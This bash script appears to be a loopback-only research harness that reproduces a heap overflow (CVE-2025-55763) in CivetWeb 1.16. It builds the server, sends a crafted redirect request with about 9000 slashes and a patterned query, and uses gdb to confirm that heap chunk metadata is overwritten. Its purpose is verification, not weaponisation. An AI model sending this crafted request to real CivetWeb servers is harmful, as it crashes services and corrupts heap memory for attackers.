#!/bin/bash
# CivetWeb CVE-2025-55763 — offline, loopback-only CHOSEN-BYTE HEADER probe.
#
# Builds the UNMODIFIED pinned v1.16 with FORTIFY off, sends one benign warm
# redirect then one crafted redirect with a 46-byte patterned query, and uses
# gdb to read the heap chunk header immediately following new_path both before
# and after the unbounded strcat chain. The assertion is that attacker-chosen
# query bytes replace the neighbour chunk's size, fd and bk fields.
#
# This is a metadata-corruption observation, NOT pointer control: the rung-4
# label stays INSTRUMENTED. No sanitizer, no network beyond 127.0.0.1.
set -u

BASE="$(cd "$(dirname "$0")" && pwd)"
OUT="${1:-$BASE/out-header}"
rm -rf "$OUT"
mkdir -p "$OUT/build" "$OUT/docroot/d"
OUT="$(cd "$OUT" && pwd)"
printf 'root\n' > "$OUT/docroot/index.html"
printf 'hello\n' > "$OUT/docroot/d/index.html"

trace="$OUT/trace.txt"
: > "$trace"
pass=0; fail=0
ck() { # name expected actual
  if [ "$2" = "$3" ]; then
    printf 'PASS %s=%s\n' "$1" "$3" >> "$trace"; pass=$((pass + 1))
  else
    printf 'FAIL %s expected=%s actual=%s\n' "$1" "$2" "$3" >> "$trace"; fail=$((fail + 1))
  fi
}

ck pin_v1_16 f0e471c1bf4e7804a6cfb41ea9d13e7d623b2bcc7bc1e2a4dd54951a24d60285 \
   "$(sha256sum "$BASE/pins/civetweb-1.16.tar.gz" | cut -d' ' -f1)"
if [ "$fail" -ne 0 ]; then cat "$trace"; exit 1; fi

tar xzf "$BASE/pins/civetweb-1.16.tar.gz" -C "$OUT/build"
V="$OUT/build/civetweb-1.16"
(cd "$V" && make WITH_CFLAGS='-U_FORTIFY_SOURCE -O0 -g' NO_SSL=1 -j4 civetweb \
  > "$OUT/vuln-build.log" 2>&1)
ck vuln_build 0 "$?"
ck unmodified_sink 1 "$(grep -c 'strcat(new_path, ri->query_string);' "$V/src/civetweb.c")"
ck no_canary_patch 0 "$(grep -c 'w1_victim' "$V/src/civetweb.c" || true)"

python3 - "$OUT" <<'PY'
import sys
out = sys.argv[1]
port = 18481
pattern = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghij"  # 46 bytes
assert len(pattern) == 46
with open(out + "/warm.req", "wb") as f:
    f.write(("GET /d HTTP/1.1\r\nHost: 127.0.0.1:%d\r\nConnection: close\r\n\r\n" % port).encode())
with open(out + "/crafted.req", "wb") as f:
    f.write(("GET /" + "/" * 9000 + "d?" + pattern
             + " HTTP/1.1\r\nHost: 127.0.0.1:%d\r\nConnection: close\r\n\r\n" % port).encode())
gdb = r'''
set pagination off
set confirm off
set print elements 0
set logging file OUTDIR/gdb.log
set logging overwrite on
set logging enabled on
set $np = 0
set $bk = 0
set $hit = 0
break civetweb.c:15257
commands
  silent
  set $hit = $hit + 1
  if $hit == 2
    set $np = new_path
    set $bk = (buflen + 8 + 15) & ~15
    printf "\n=== CRAFTED_SINK new=%p buflen=%lu chunkspan=%lu size_off=%lu ===\n", $np, (unsigned long)buflen, (unsigned long)$bk, (unsigned long)($bk - 8)
    printf "PRE_SIZE "
    x/1gx new_path + $bk - 8
  end
  continue
end
break civetweb.c:15264
commands
  silent
  if $hit == 2
    printf "POST_SIZE "
    x/1gx new_path + $bk - 8
    printf "POST_FD_BK "
    x/2gx new_path + $bk
  end
  continue
end
run -listening_ports 127.0.0.1:PORT -document_root OUTDIR/docroot -num_threads 1 -access_log_file OUTDIR/access.log -error_log_file OUTDIR/error.log
'''
gdb = gdb.replace("OUTDIR", out).replace("PORT", str(port))
with open(out + "/probe.gdb", "w") as f:
    f.write(gdb)
PY

gdb -batch -x "$OUT/probe.gdb" --args "$V/civetweb" > "$OUT/gdb-stdout.log" 2>&1 &
GDBPID=$!
for i in $(seq 1 60); do
  (echo > /dev/tcp/127.0.0.1/18481) >/dev/null 2>&1 && break
  sleep 0.1
done
timeout 6 nc 127.0.0.1 18481 < "$OUT/warm.req" > "$OUT/warm-client.out" 2>&1
sleep 0.4
timeout 8 nc 127.0.0.1 18481 < "$OUT/crafted.req" > "$OUT/crafted-client.out" 2>&1
sleep 1
kill "$GDBPID" 2>/dev/null || true
wait "$GDBPID" 2>/dev/null || true

L="$OUT/gdb.log"
ck sink_hit 1 "$(grep -c 'CRAFTED_SINK' "$L" || true)"
ck sink_buflen 8240 "$(sed -n 's/.*buflen=\([0-9]*\).*/\1/p' "$L" | head -1)"
ck chunk_span 8256 "$(sed -n 's/.*chunkspan=\([0-9]*\).*/\1/p' "$L" | head -1)"
ck size_offset 8248 "$(sed -n 's/.*size_off=\([0-9]*\).*/\1/p' "$L" | head -1)"
ck pre_size_is_plausible 1 "$(awk '/PRE_SIZE/{print ($NF != "0x0" && $NF != "0x504f4e4d4c4b4a49") ? 1 : 0}' "$L" | head -1)"
# query[8..15]="IJKLMNOP" overwrites the neighbour size field; [16..23] and
# [24..31] overwrite its fd/bk pointers (little-endian).
ck post_size 0x504f4e4d4c4b4a49 "$(awk '/POST_SIZE/{print $NF}' "$L" | head -1)"
ck post_fd 0x5857565554535251 "$(awk '/POST_FD_BK/{print $(NF-1)}' "$L" | head -1)"
ck post_bk 0x3534333231305a59 "$(awk '/POST_FD_BK/{print $NF}' "$L" | head -1)"
ck allocator_abort 1 "$(grep -c 'SIGABRT' "$L" || true)"

printf 'PASS_COUNT=%d\n' "$pass" >> "$trace"
printf 'FAIL_COUNT=%d\n' "$fail" >> "$trace"
printf 'TRACE_SHA256=%s\n' "$(sha256sum "$trace" | cut -d' ' -f1)" >> "$trace"
cat "$trace"
[ "$fail" -eq 0 ]
